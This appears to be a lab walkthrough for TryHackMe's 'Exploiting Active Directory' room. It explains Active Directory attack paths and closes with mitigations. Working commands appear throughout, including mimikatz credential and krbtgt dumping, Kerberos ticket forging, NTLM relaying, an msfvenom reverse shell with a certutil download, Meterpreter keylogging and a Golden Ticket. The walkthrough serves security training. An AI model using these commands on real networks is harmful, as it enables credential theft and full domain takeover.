# Exploiting Active Directory

### AD Exploitation

The exploitation phase exploits misconfigurations to perform a combination of lateral movement and privilege 
escalation until we reach a suitable position to execute our goals, as shown in the diagram below. This 
phase is usually combined with persistence, to ensure that we can't lose the new position we gain, and 
additional enumeration since our new position might allow us to acquire additional information about the lay 
of the land.

![Cyber kill chain](../pictures/kill-chain.png)

**Learning Objectives:**

- AD Delegation
- Forcing Authentication Relays
- Group Policy Objects
- Targeting AD Users
- Domain Trusts
- Silver and Golden Tickets

### Exploiting Permission Delegation

Active Directory can delegate permissions and privileges through a feature called Permission Delegation.
Delegation is what makes AD so powerful in organisations. Imagine we work for an organisation that has 50000 
employees. Since we care about security, we only have three users that have access to DA credentials. It 
would be impossible for those three users to field all requests from the users, such as resetting their 
passwords. Using Delegation, we can delegate the permission to force change a user's password to the 
Helpdesk team, meaning they now have a delegated privilege for this specific function. In principle, to keep 
Delegation secure, the principle of least privilege should be followed.

**Permission Delegation**

Permission Delegation attacks a.k.a ACL-based attacks

AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access 
Control Lists (DACLs), hence the name ACL-based attacks. Almost any AD object can be secured with ACEs, 
which then describe the allowed and denied permissions that any other AD object has against the target 
object.

However, if these ACEs are misconfigured, it may be possible for an attacker to exploit them. Let's look at 
our example again. If the IT Support team were granted the ForceChangePassword ACE over the Domain Users 
group, this would be considered insecure. Sure they would be able to reset the passwords of employees that 
forgot their passwords, but this misconfiguration would allow them to also reset the passwords of privileged 
accounts, such as the accounts that are members of the Domain Admins group essentially allowing for 
privilege escalation.

**Exploiting ACEs**

A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound docs](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assist in explaining enumerated ACEs and how they can be exploited.

Notable ACEs:

- ForceChangePassword: We have the ability to set the user's current password without knowing their current 
password.

- AddMembers: We have the ability to add users (including our own account), groups or computers to the 
target group.

- GenericAll: We have complete control over the object, including the ability to change the user's password, 
register an SPN or add an AD object to the target group.

- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for 
example, update the scriptPath parameter, which would cause a script to execute the next time the user logs 
on.

- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the 
owner, allowing us to gain additional permissions over the object.

- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write 
an ACE that grants our account full control over the target object.

- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against 
the target object. This includes, for example, the ability to force change a user's password.

In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two 
best options for this are: 

- AD-RSAT PowerShell cmdlets
- PowerSploit. 

Depending on the breach and the detection tools in the environment, one option may be stealthier.

**Bloodhound**

Execute SharpHound (same version as BloodHound installation!) on a windows machine connected to the domain

`SharpHound.exe --CollectionMethods All --Domain <DOMAIN> --ExcludeDCs`

Use scp to copy the zip file to our atacking machine:

`scp <USERNAME>@<WINDOWS-MACHINE>:C:/path/to/zip/file .`

Start Neo4j and BloodHound;

```
neo4j console

bloodhound --no-sandbox
```

Authenticate with Neo4j credentials.

**Privilege Escalation**

- Search for privileges associated with the user account
- Search for administrative privileges on all workstations
- View roads in bloodhound leading to accounts for privilege escalation
- Look for permission delegation misconfiguration leading to attack paths

A road from our Domain user to the T2 admins shows that a GenericWrite privilege for IT Support is delegated 
to domain which in turn allows IT Support group members ForceChangePassword of T" admins

Exploit the GenericWrite privilege delegation misconfiguration by adding your domain user to IT Support:

THMWRK1
```
powershell
Add-ADGroupMember "IT Support" -Members
```

**ForceChangePassword**

Find an account to takeover:

`Get-ADGroupMember -Identity "Tier 2 Admins"`

Set a new password:

```
$Password = ConvertTo-SecureString "NewPassword" -AsPlainText -Force
Set-ADAccountPassword -Identity "UsernameOfTarget" -Reset -NewPassword $Password
```

Note: Permissions can take a few minutes to propagate through the domain.

### Exploiting Kerberos Delegation

When talking about AD Delegation, Kerberos Delegation is what is usually being discussed, not Permission 
Delegation.

**Kerberos Delegation**

Kerberos Delegation enables an application to access resources hosted on a different server. An example of 
this would be a web server that needs to access a SQL database hosted on the database server for the web 
application that it is hosting. Without delegation, we would probably use an AD service account and provide 
it with direct access to the database. When requests are made on the web application, the service account 
would be used to authenticate to the database and recover information.

However, we can allow this service account to be delegated to the SQL server service. Once a user logs into 
our web application, the service account will request access to the database on behalf of that user. This 
means that the user would only be able to access data in the database that they have the relevant 
permissions for without having to provide any database privileges or permissions to the service account 
itself.

**Constrained vs Unconstrained**

Unconstrained is the least secure and sets no limits to the delegation. If a user with the 
"TRUSTED_FOR_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configured, a 
ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later 
if needed.

Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they 
could attempt to force a privileged account to authenticate to the host, which would allow them to intercept 
the generated TGT and impersonate the privileged service.

To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 
2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an 
account is compromised. The following are examples of services that can be configured for delegation:

- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the 
delegated account can't just be used for everything. However, it can still be used for some powerful 
exploitation.

An example of this would be if we were able to compromise an AD account that had constrained delegation 
configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate 
a TGT for this account, then use the TGT to execute a ticket-granting server (TGS) request for any 
non-sensitive user account in order to access the service as that user.

**Resource-Based Constrained Delegation**

Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional 
restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. 

Instead of specifying which object can delegate to which service, the service now specifies which objects 
can delegate to it. This allows the service owner to control who can access it. In our web application 
example, this means that instead of specifying that the web service account can delegate to the database 
service to access the database, we can now specify that on the database service that the web service account 
is allowed to delegate access to it.

Let's say that we have permission to configure RBCD for a service. This means we have the ability to set the 
msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with 
the details of an AD account that we have access to. To now gain access to the service, we can generate a 
TGT for the account we control, which will allow us to interact with this service. [Example here](https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/)

**Constrained Delegation Exploitation**

Exploiting Constrained Delegation

Enumerate accounts eligible for exploitation with PowerView

```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```

One account, svcIIS, has the TRUSTED_TO_AUTH_FOR_DELEGATION flag and the msds-allowedtodelegateto attribute 
for http/THMSERVER1.za.tryhackme.loc and WSMAN/THMSERVER1.za.tryhackme.loc. This means the svcIIS account 
can delegate the HTTP and WSMAN services on the target THMSERVER1. 

PowerShell remoting uses the HTTP and WSMAN services allowing us to start remote sessions with Delegation 
to gain Tier 1 Admin access to the target. 

As an Administrator on jump server, run mimikatz to dump LSASecrets showing plain text passwords

```
token::elevate
lsadump::secrets
```

The plain text password for svcIIS is dumped, allowing us to perform a Kerberos delegation attack.

Create a TGT for the compromised service account with kekeo.exe

`tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:password`

Next, we forge TGS requests for the account we want to impersonate for both services (HTTP and WSMAN) with kekeo.exe

```
# WSMAN
tgs::s4u /tgt:<TGT-FROM-KEKEO> /user:<USER-TO-IMPERSONATE> /service:WSMAN/THMSERVER1.za.tryhackme.loc
# HTTP
tgs::s4u /tgt:<TGT-FROM-KEKEO> /user:<USER-TO-IMPERSONATE> /service:http/THMSERVER1.za.tryhackme.loc
```

Import the TGS tickets into mimikatz

```
# Check privilege
privilege::debug

# import WSMAN TGS
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_WSMAN~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# import HTTP TGS
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
``` 

Exit mimikatz and verify the tickets are imported with `klist`

Create a PSSession on THMSERVER1 to gain access as a Tier 1 Admin

```
New-PSSession -ComputerName thmserver1.za.tryhackme.loc

Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

### Exploiting Automated Relays

In this task we will take a look at some automated relays. Authentication attempts are constantly flying 
across the network, and as shown in the Breaching AD room, if we are lucky, we can intercept some of these 
challenges to gain access. What if we can coerce authentication to occur?

Although we already have privileged access to THMSERVER1, we could be in a position where we did not have 
access to a constrained delegation exploit. This is another excellent attack that can be performed to gain 
privileged access to hosts. 

**Machine Accounts**

Unless tampered with, machine account passwords are uncrackable. By default, they are 120 characters (UTF16)
long and are automatically rotated every 30 days.

In AD, these machine accounts are used quite a bit in different services. Different domain controllers use 
their machine accounts to synchronise AD updates and changes. When you request a certificate on behalf of 
the host you are working on, the machine account of that host is used for authentication to the AD 
Certificate Service.

There is an exceptional case in AD, where one machine has admin rights over another machine. Essentially in 
the AD configuration, administrative permissions over a host have been granted to another host. However, 
these instances provide a very interesting attack vector for coercing authentication.

Identify instances where a computer has the "AdminTo" relationship over another computer by writing a custom
Bloodhound query in the Analysis tab.

Bloodhound AdminTo query

`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`

**The Printer Bug**

*It's not a bug, it's  a feature - Microsoft*

When this was reported, Microsoft responded that this was a feature. The printer bug is a "feature" of the 
MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host 
running the Print Spooler service to authenticate to an arbitrary IP address. 

There have been a few of these bugs in recent years: Spooler, PetitPotam, PrintNightmare. Microsoft claims 
that the only bug is that some of these did not require AD credentials at all, but this issue has been 
resolved through security patches.

Therefore, to exploit this, apart from machine account administrative privileges, we also need to meet the 
following four conditions:

1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.

Condition 1 and 2 have been met already. The only two we need to ensure works are conditions 3 and 4.

**Print Spooler Service**

Use a WMI query to query the Print Spooler service's current state

`GWMI Win32_Printer -ComputerName thmserver2.za.tryhackme.loc`

We may get an access denied error, then we can try the PowerShell `Get-PrinterPort` command

`Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`

If both commands throw an error we may need to take a leap of faith and assume condition 3 is met.

**SMB signing**

In order to relay the coerced authentication attempt, SMB signing should not be enforced. It should be noted 
that there is a difference between SMB signing being allowed and SMB signing being enforced. Since some 
legacy systems do not support SMB signing, by default, the configuration of SMB is that signing is allowed 
but not enforced, meaning that it will only be used if supported.

Since we will be hosting a malicious SMB server, we can ensure our server does not support signing, forcing 
the target not to sign the SMB authentication attempt.

To verify that THMSERVER1 and THMSERVER2 do not have SMB signing enforced, we can use Nmap:

`nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`

**Exploiting Authentication Relays**

We will be using [SpoolSample](https://github.com/leechristensen/SpoolSample) to exploit the authentication relay. It is a C# exploit but has already been
compiled for you and stored in the C:\Tools\ directory on THMWRK1.  We will use Spoolsample.exe to coerce 
THMSERVER2 to authenticate to us on our AttackBox and then Impacket's ntlmrelayx.py to relay the 
authentication attempt THMSERVER1. Note that if you are using your own VM, you will need to make sure you 
have the updated version of Impacket that supports SMBv2.

The first step is to set up the NTLM relay using the IP address of the target, if we use the hostname the 
host could request Kerberos authentication:

`python3 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug`

Using SpoolSample to coerce authentication from a jump server (THMWRK1) on the network:

`SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

You should receive an authentication attempt and a relay to the target (THMSERVER1), by specifying no 
command the relay should dump the SAM hashes of the target.

To execute a command on response use the `-c` option

`python3 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug`

### Exploiting AD Users

Targeting AD users can also be seen as post-exploitation but is often an excellent thing to use when we are 
still performing exploitation to reach a suitable position for goal execution.

**Users and User Behaviour**

Users are often the weakest link in the security chain. Just think about weak passwords and bad habits, such 
as granting overly permissive permissions. It would be ignorant and ineffective to overlook this attack 
surface. While it is good to build up a proper enumeration and attack methodology against AD users, in this 
task, we will focus on two elements:

- Credential Management - How users store their credentials. In AD, this is quite important since users may 
have multiple sets of credentials and remembering all of them can be a hassle.

- Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. 
Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker's 
perspective.

**Hunting for Credentials**

Search User directories for password databases, files that may contain passwords, run meterpreter modules to 
extract passwords from web browsers, anything you can think of.

SYSTEM is Sometimes Too Privileged

Meterpreter has a built-in keylogger. This will be useful for extracting the user's keystrokes. However, we 
can't just start this keylogger and hope for the best since our shell is currently running in the SYSTEM 
context. SYSTEM won't be typing any keystrokes, so this won't help us. To capture the correct user's 
credentials, we will need to ensure that our shell is running in the context of that user.

Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should 
be able to migrate to any process. You have remote code execution on THMSERVER1, use this to get a 
Meterpreter shell. If you need a recap on using Meterpreter and Metasploit, here is a module on its use. 
However for a quick rundown, you can use the following command to generate a PowerShell meterpreter payload:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`

You can then also use the following to create the associated listener in the msfconsole:

`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"`

You can host your meterpreter shell using a Python webserver and then copy it using something like this:

`certutil.exe -urlcache -split -f http:///shell.ps1`

Once you have a meterpreter shell, you can continue. The first step is to see if the users have any running 
process

`meterpreter> ps | grep explorer`

If there are running explorer processes migrate to one of them

`meterpreter> migrate 3122`

Start the keylogger and wait, then dump the captured keystrokes

```
meterpreter> keyscan_start
meterpreter> keyscan_dump
```

This gives us the password for the .kdbx file which contains credentials for an account we haven't seen yet, 
svcServMan

### Exploiting GPOs

Perform some enumeration to find out if the svcServMan account can be useful to us.

In the Bloodhound Node info tab, First Degree Object Control shows the number of objects in Active Directory 
that this user can take control of, without relying on security group delegation. 

First Degree Object Control for the svcServMan account shows it has GenericWrite permissions over the 
Management Server Pushes Policy, a Group Policy Object (GPO).

By looking at the Affected Computer Objects for the Management Server Pushes GPO we see that it's applied to 
THMSERVER2, providing an oportunity for further AD exploitation.

**Group Policy Objects**

The SYSVOL directory is where AD GPOs are stored to be replicated to domain-joined machines. A GPO is a 
virtual collection of policy settings. Each GPO has a unique name, called a GUID. That's why if you try to 
read the contents of the SYSVOL directory, it won't make a lot of sense with all the random names.

Each Windows computer has a Local Policy Configuration. This contains several notable configurations such as:

- Application configuration for services such as the Firewall, Anti-Virus, and Applocker.
- Local Group membership such as the Administrator or Remote Desktop Users groups.
- Startup configuration such as scripts that should be executed.
- Security and protocol settings such as SMBv1 support.

These are just a few examples. There are a significant amount of configuration options that can be set. 

**Group Policy Mangement**

If you only have one Windows computer, it is easy to change the local policy configuration directly on the 
host. However, you need a mechanism to deploy a configuration from a central location in large 
organisations. This is where Group Policy Management (GPM) comes into play. Instead of defining policies 
locally on each machine, GPM allows us to define policies directly on the AD structure. Essentially, we can 
define GPOs for AD objects, such as a specific OU or group.

Domain-joined computers would then pull all policies from SYSVOL periodically and apply the relevant ones. 
By default, policies are replicated every 15 minutes through the gpupdate application. We can, however, also 
manually execute this application from Command Prompt to apply policies instantly.

**Exploiting GPOs**

Although there are several ways in which GPOs can be exploited, we will stick with the simple solution of 
adding an AD account we control to both the local Administrators and local Remote Desktop Users groups. This 
will allow us administrative privileges on THMSERVER2 and the ability to RDP in. We could also use the 
exposed SSH port, but not many organisations have upgraded to providing SSH access. Hence, RDP access or 
conventional lateral movement techniques like SMBExec are safer.

In order to modify the GPO, we need to access Group Policy Management as the AD user that has the relevant 
permissions. We could RDP into THMSERVER1 as the user, but that may kick the user out of their active 
session, raising suspicion. Instead, we will RDP into THMWRK1 with either our normal or our Tier 2 Admin 
account, inject the AD user's credentials into memory using the runas command from an administrative command 
prompt, and open MMC to modify the GPO.

RDP to the jump server with our standard user 

`xfreerdp /v:thmwrk1.za.tryhackme.loc /u:user /p:password`

From an admin command prompt inject the AD user's credentials into memory using the runas command

`runas /netonly /user:za.tryhackme.loc\<AD-USERNAME> cmd.exe`

Check the credentials are correct

`dir \\za.tryhackme.loc\sysvol`

Start the Microsoft Management Console `mmc` 

In the MMC window:

1. click File -> Add/Remove Snap-in
2. Select the Group Policy Management Snap-in and click Add
3. Click OK

Navigate to the GPO that our user has permission to modify 

Servers -> Management Servers -> Management Server Pushes

Right click the GPO and select Edit, then add our account to the local groups

1. Expand Computer Configuration
2. Expand Policies
3. Expand Windows Settings
4. Expand Security Settings
5. Right Click on Restricted Groups and select Add Group
6. Click Browse, enter IT Support and click Check Names
7. Click Okay twice

The first filter is not used. For the second filter, we want to add both the Administrators and Remote 
Desktop Users groups.

Once the configuration has been made, we can click Apply and OK. Now, all we need to do is wait for a 
maximum of 15 minutes for the GPO to be applied.

After this, our initial account that we made a member of the IT Support group will now have administrative 
and RDP permissions on THMSERVER2

### Exploiting Certificates

Research done and released as a [post](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [whitepaper](./certified-pre-owned.pdf) by SpecterOps showed that it was possible to 
exploit misconfigured certificate templates for privilege escalation and lateral movement. If you want to 
better understand certificate misconfigurations and how to identify them, please have a look at [this room](http://tryhackme.com/jr/adcertificatetemplates)

**AD Certificate services**

AD Certificate Services (CS) is Microsoft's Public Key Infrastructure (PKI) implementation. Since AD 
provides a level of trust in an organisation, it can be used as a CA to prove and delegate trust. AD CS is 
used for several things, such as encrypting file systems, creating and verifying digital signatures, and 
even user authentication, making it a promising avenue for attackers.

Since AD CS is a privileged function, it usually runs on selected domain controllers. Meaning normal users 
can't really interact with the service directly. On the other side of the coin, organisations tend to be too 
large to have an administrator create and distribute each certificate manually. This is where certificate 
templates come in. Administrators of AD CS can create several templates that can allow any user with the 
relevant permissions to request a certificate themselves. These templates have parameters that say which 
user can request the certificate and what is required. SpecterOps found that specific combinations of these 
parameters can be incredibly toxic and abused for privilege escalation and persistent access.

Before we dive deeper into certificate abuse, some terminology:

- PKI - Public Key Infrastructure is a system that manages certificates and public key encryption
- AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on 
domain controllers
- CA - Certificate Authority is a PKI that issues certificates
- Certificate Template - a collection of settings and policies that defines how and when a certificate may 
be issued by a CA
- CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
- EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be 
used

**Finding Vulnerable Certificate Templates**

We can use `certutil` to enumerate certificates and find vulnerable templates:

`PS:> certutil -Template -v > templates.txt`


This will provide output on all configured templates. We could also use a certificate auditing tool such as [Ghostpack's PSPKIAudit](https://github.com/GhostPack/PSPKIAudit). However, a manual approach allows us to make sure we find all possible misconfigurations.

A certificate template is deemed misconfigured if a combination of parameter values becomes poisonous, 
allowing the requester to perform privilege escalation. In our case, we are looking for a template with the 
following poisonous parameter combination:

- Client Authentication - The certificate can be used for Client Authentication.
- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative 
Name (SAN).
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
- Certificate Permissions - We have the required permissions to use the certificate template.

Template[32] is the vulnerable template. In this template, we can see that the machine account of THMSERVER2 
can issue a CSR for a template that allows us to specify the Subject Alternative Name (SAN) and can be used 
for client authentication.

SpecterOps mentions eight common security misconfigurations with AD CS, so it should be noted that there are 
still a significant amount of potential misconfigurations that can be found.

**Exploiting a Certificate Template**

Using RDP access we will now request our certificate using the Microsoft Management Console (MMC):

1. Click Start->run
2. Type mmc and hit enter
3. Click File->Add/Remove Snap-in..
4. Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
5. Click OK

We will request a personal certificate:

1. Right Click on Personal and select All Tasks->Request New Certificate...
2. Click Next twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional 
information.
4. Click on the More Information warning.
5. Change the Subject name Type option to Common Name and provide any value, since it does not matter, and 
click Add.
6. Change the Alternative name Type option to User principal name.
7. Supply the UPN of the user you want to impersonate, the best would be a DA account, and click Add.

The last step is to export our certificate with the private key:

1. Right-click on the certificate and select All Tasks->Export...
2. Click Next, select Yes, export the private key, and click Next.
3. Click Next, then set a password for the certificate since the private key cannot be exported without a password.
4. Click Next and select a location to store the certificate.
5. Click Next and finally click Finish.

**User Impersonation through a Certificate**

Now we can finally impersonate a user. To perform this, two steps are required:

- Use the certificate to request a Kerberos ticket-granting ticket (TGT)
- Load the Kerberos TGT into your hacking platform of choice

For the first step, we will be using [Rubeus](https://github.com/GhostPack/Rubeus) to request the TGT:

`Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:/path/to/file /password: /outfile: /domain:za.tryhackme.loc /dc:`

Let's break down the parameters:

    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually it is best to select a DC that has a CA service running

Once we execute the command, we should receive our TGT which we load with mimikatz:

```
mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt cert-file.kirbi

* File 'cert-file.kirbi': OK
```

Verify DC access

`dir \\THMDC.za.tryhackme.loc\c$\`

We now have access to Tier 0 infrastructure and have compromised the full child domain.

### Exploiting Domain Trusts

Even though we have access to Tier 0 infrastructure, this is still not enough. We have only exploited the 
ZA.TRYHACKME.LOC domain. TRYHACKME must have domains for other regions. If we take control of the root 
domain, TRYHACKME.LOC, we will be in a position to compromise all of the regional domains. In this task, we 
will look at how domain trust can be exploited to take control of the entire forest.

**Domain Trusts**

A forest is a collection of one or more domain trees inside an AD network. Domain Trusts are a mechanism for 
users in the network to gain access to other resources in the domain. For the most part, trusts outline how 
the domains inside of a forest communicate with each other. In some environments, trusts can be extended out 
to external domains and even forests in some cases.

There are two main types of trusts that can be configured between domains:

- Directional - The direction of the trust flows from a trusting domain to a trusted domain
- Transitive - The trust relationship expands beyond just two domains to include other trusted domains

It is common to have a root or parent domain in a forest. In our case, this is TRYHACKME.LOC. For each 
regional office, sub or child domains are created, such as ZA.TRYHACKME.LOC or UK.TRYHACKME.LOC. This forest 
configuration will allow the sharing of resources between the ZA and the UK office.

For example, if some user in the UK office requires access to THMSERVER1, we can grant access for the user 
in the ZA domain. This permission delegation works since there is bidirectional trust between ZA and the 
root domain and the UK and the root domain, essentially creating a transitive trust between ZA and UK.

As mentioned above, the trust between a parent and child domain is bidirectional. This is intended behaviour 
and is used to share resources through greater transitive trust relationships. However, as an attacker, we 
can also exploit this trust to compromise the parent domain if we have compromised a child domain.

**KRBTGT and Golden Tickets**

KRBTGT is the account used for Microsoft's implementation of Kerberos. The name is derived from Kerberos 
(KRB) and Ticket Granting Ticket (TGT). Essentially, this account acts as the service account for the 
Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. This account is used 
to encrypt and sign all Kerberos tickets for the domain. Since the password hash is shared by all domain 
controllers, they can then verify the authenticity of the received TGT when users request access to 
resources.

If we want to generate our own TGTs to grant us access to everything, we use a Godlen Ticket attack. In a 
Golden Ticket attack we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket 
Granting Server (TGS). To forge TGTs we need the following information:

- The FQDN of the domain
- The Security Identifier (SID) of the domain
- The username of the account we want to impersonate
- The KRBTGT password hash

The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT 
password hash is only stored on domain controllers. 

We will use mimkatz with DC Sync to recover the KRBTGT password hash on THMSERVER2:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:za\krbtgt
```

**Inter-Realms TGTs**

Using the KRBTGT password hash, we could now forge a Golden Ticket to access any resource in the child 
domain. However, we can take this a step further by forging an Inter-Realm TGT. Inter-Realm TGTs are used to 
provide access to resources in other domains. In our case, we want to exploit the bidirectional trust 
relationship between the child and parent domain to gain full access to the parent domain.

We will include extra account SIDs from other domains when we construct the Golden Ticket to perform this 
exploit. Mimikatz can assist with this, allowing us to set the ExtraSids section of the KERB_VALIDATION_INFO 
structure of the Kerberos TGT. The ExtraSids section is described as “A pointer to a list of KERB_SID_AND_
ATTRIBUTES structures that contain a list of SIDs corresponding to groups in domains other than the account 
domain to which the principal belongs”.

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID 
of the Enterprise Admins (EA) group as an extra SID to our forged ticket for the domain controller of the 
child domain. 

The EA group belongs to the parent domain and membership to this group essentially grants Administrative 
privileges over the entire forest! The default SID for this group is S-1-5-21-<RootDomain>-519.

Before we can go into exploitation, we first need to recover two SIDs:

- The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT
- The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT

To recover these SIDs, we can use the AD-RSAT Powershell cmdlets. 

To recover the SID of the child domain controller use the following command:

`Get-ADComputer -Identity "THMDC"`

To recover the SID of the Enterprise Admins group use the following command:

`Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc (or <ROOT-DC-IP>)`

**Exploiting Domain Trust**

Now that we have all the information, use mimikatz to create the Golden Ticket:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<KRBTGT-HASH> /sids:<EA-GROUP-SID> /ptt
```

### Conclusion

Exploiting AD takes time to master, and the techniques used will highly depend on the configuration of the 
AD structure that is being attacked. The biggest thing to understand is that the process is cyclic.

In most cases we will not be able to run a single boot-to-root exploit that gives us DA access. The best 
approach is to perform exploitation that furthers your access, then use the access that was achieved to 
perform enumeration again, looking for additional exploit paths that may be possible from this new position.

**Mitigations**

AD exploitation, like AD enumeration, is incredibly hard to defend against. This is because what may be 
considered a misconfiguration that can be exploited, has an actual business case. However, we can do a 
couple of things to protect against exploitation:

- We need to ensure that no configuration breaks our tiering model. Accounts in a lower tier should not have 
the ability to interact with resources in a higher tier. Furthermore, accounts from a higher tier should 
never log onto resources in a lower tier.
- The principle of least privilege should be followed when permission delegation is performed. Furthermore, 
permission delegation should adhere to the tiering model, ensuring that a lower-tiered object can't alter a 
higher tiered object.
- SMB signing should be enforced, not just enabled. This will prevent credential relay attempts.
- AD objects and their configuration are not the only paths for exploitation. AD services, such as AD CS 
should also be considered part of the attack surface and secured.
- We need to implement sufficient security controls to protect Tier 0 infrastructure and accounts in our 
child domains since a compromise of one can lead to the compromise of the entire forest.
